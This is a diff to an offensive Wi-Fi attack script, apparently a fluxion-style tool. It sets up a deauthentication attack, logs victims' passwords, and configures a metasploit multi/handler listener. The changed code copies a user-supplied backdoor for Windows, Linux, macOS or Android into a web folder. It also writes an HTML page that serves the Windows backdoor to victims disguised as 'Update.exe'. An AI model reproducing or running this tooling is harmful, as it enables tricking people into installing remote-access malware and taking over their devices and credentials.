@@ -35,13 +35,13 @@ DUMP_PATH="/tmp/TMPflux"
 WORK_DIR=`pwd`
 HANDSHAKE_PATH="$WORK_DIR/handshakes"
 PASSLOG_PATH="$WORK_DIR/../../../Victim/pwlog"
-path_metasploit="$WORK_DIR/sites/metasploit"
+sites_path="$WORK_DIR/sites"
 script_listerning="$WORK_DIR/sites/metasploit/script-listerning.rc"
 win_auto_command="$WORK_DIR/sites/metasploit/win-auto-script.rc"
 linux_auto_command="$WORK_DIR/sites/metasploit/linux-auto-script.rc"
 macos_auto_command="$WORK_DIR/sites/metasploit/mac-auto-script.rc"
 android_auto_command="$WORK_DIR/sites/metasploit/android-auto-script.rc"
-path_site_metasploit="$WORK_DIR/sites/metasploit/"
+path_metasploit="$WORK_DIR/sites/metasploit"
 DEAUTHTIME="9999999999999"
 Metasp_configure=""
 revision=9
@@ -375,6 +375,7 @@ top
 checkdependences
 
 # Create working directory
+rm -rf $path_metasploit
 if [ ! -d $DUMP_PATH ]; then
         mkdir -p $DUMP_PATH &>$flux_output_device
 fi
@@ -1681,7 +1682,7 @@ function attack {
                 case $yn in
                         1 ) matartodo; CSVDB=dump-01.csv; selection; break;;
                         2 ) matartodo;
-			    rm -r $path_site_metasploit/backdoor/*;
+			    rm -r $path_metasploit/files/*;
 			    exitmode;
 			    break;;
                         * ) echo "$general_case_error"; conditional_clear ;;
@@ -2778,23 +2779,24 @@ function yourmod {
 	
 }
 function metasploit {
-	cd $path_site_metasploit
-	check_folder_backdoor=`find  -name backdoor -type d | grep -w "./backdoor"`
-	if [ "$check_folder_backdoor" = "./backdoor" ]; then
+	service postgresql start > /dev/null 2>&1
+	cd $sites_path
+	check_folder_msf=`find  -name metasploit -type d | grep -w "./metasploit"`
+	if [ "$check_folder_msf" = "./metasploit" ]; then
 		echo ""
-	elif [ "$check_folder_backdoor" != "./backdoor" ]; then
-	 	mkdir backdoor
+	elif [ "$check_folder_msf" != "./metasploit" ]; then
+	 	mkdir metasploit
+	fi
+	cd $path_metasploit
+	check_folder_backdoor=`find  -name files -type d | grep -w "./files"`
+	if [ "$check_folder_backdoor" = "./files" ]; then
+		echo ""
+	elif [ "$check_folder_backdoor" != "./files" ]; then
+	 	mkdir files
 	fi
 	cd $WORK_DIR
-	echo -ne " ${red}=>${white} Enter the location folder of backdoor : ${transparent}"
-	read folder
-	folder_backdoor=`echo "$folder" | cut -d "'" -f2` > /dev/null 2>&1
-	cp $folder_backdoor/* $path_site_metasploit/backdoor
-
-        mkdir $DUMP_PATH/data &>$flux_output_device
-    	cp -r  $path_site_metasploit/* $DUMP_PATH/data
-	rm -rf $script_listerning
-	touch $script_listerning
+	rm -rf $script_listerning > /dev/null 2>&1
+	touch $script_listerning > /dev/null 2>&1
 	echo "use exploit/multi/handler" > $script_listerning
 	echo -e " ${red}=>${white} Select the OS you want to attack${transparent}"
 cat << !
@@ -2818,6 +2820,11 @@ cat << !
 		read id_OS
 		case $id_OS in
 			1)
+				echo -ne " ${red}=>${white} Enter the location file backdoor (Windows run file): ${transparent}"
+				read folder
+				file_backdoor=`echo "$folder" | cut -d "'" -f2` > /dev/null 2>&1
+				backdoor_name_windows=${file_backdoor##*/}
+				cp $file_backdoor $path_metasploit/files/
 				echo -ne " ${red}=>${white} Set up payload : ${transparent}"
 				read paylo_win
 				echo -ne " ${red}=>${white} Set up port : ${transparent}"
@@ -2838,6 +2845,11 @@ cat << !
 						done
 				echo "exploit -j -z" >> $script_listerning;;
 			2)
+				echo -ne " ${red}=>${white} Enter the location file backdoor (Linux run file): ${transparent}"
+				read folder
+				file_backdoor=`echo "$folder" | cut -d "'" -f2` > /dev/null 2>&1
+				backdoor_name_linux=${file_backdoor##*/}
+				cp $file_backdoor $path_metasploit/files/
 				echo -ne " ${red}=>${white} Set up payload : ${transparent}"
 				read paylo_linux
 				echo -ne " ${red}=>${white} Set up port : ${transparent}"
@@ -2859,6 +2871,11 @@ cat << !
 						done
 				echo "exploit -j -z" >> $script_listerning;;
 			3)
+				echo -ne " ${red}=>${white} Enter the location file backdoor (Linux run file): ${transparent}"
+				read folder
+				file_backdoor=`echo "$folder" | cut -d "'" -f2` > /dev/null 2>&1
+				backdoor_name_mac=${file_backdoor##*/}
+				cp $file_backdoor $path_metasploit/files/
 				echo -ne " ${red}=>${white} Set up payload : ${transparent}"
 				read paylo_macos
 				echo -ne " ${red}=>${white} Set up port : ${transparent}"
@@ -2880,6 +2897,11 @@ cat << !
 						done
 				echo "exploit -j -z" >> $script_listerning;;
 			4)
+				echo -ne " ${red}=>${white} Enter the location file backdoor (Linux run file): ${transparent}"
+				read folder
+				file_backdoor=`echo "$folder" | cut -d "'" -f2` > /dev/null 2>&1
+				backdoor_name_android=${file_backdoor##*/}
+				cp $file_backdoor $path_metasploit/files/
 				echo -ne " ${red}=>${white} Set up payload : ${transparent}"
 				read paylo_android
 				echo -ne " ${red}=>${white} Set up port : ${transparent}"
@@ -2904,6 +2926,19 @@ cat << !
 			*) echo -e "Unknown option. Please choose again";
 			esac
 	done
+echo "
+<!DOCTYPE html>
+<html>
+<body>
+
+<p>a<p>
+
+<a href="files/$backdoor_name_windows" download="Update.exe">Click on</a>
+</body>
+</html>
+" > $path_metasploit/index.html
+        mkdir $DUMP_PATH/data &>$flux_output_device > /dev/null 2>&1
+    	cp -r  $path_metasploit/* $DUMP_PATH/data > /dev/null 2>&1
 }
 ######################################### < INTERFACE WEB > ########################################
 top && setresolution && setinterface
